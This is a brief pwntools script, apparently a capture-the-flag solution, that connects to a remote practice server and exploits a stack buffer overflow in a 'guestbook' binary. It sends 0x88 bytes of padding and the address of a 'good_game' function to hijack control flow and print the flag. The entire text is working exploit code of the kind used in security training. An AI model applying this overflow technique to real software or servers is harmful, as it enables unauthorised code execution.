from pwn import *

elf=ELF('./guestbook')
r = remote('node3.buuoj.cn', 27463)

r.recvline()
r.send('a' * 0x88 + p64(elf.symbols['good_game']))
r.recvline()
flag = r.recvline(False)
print(flag)
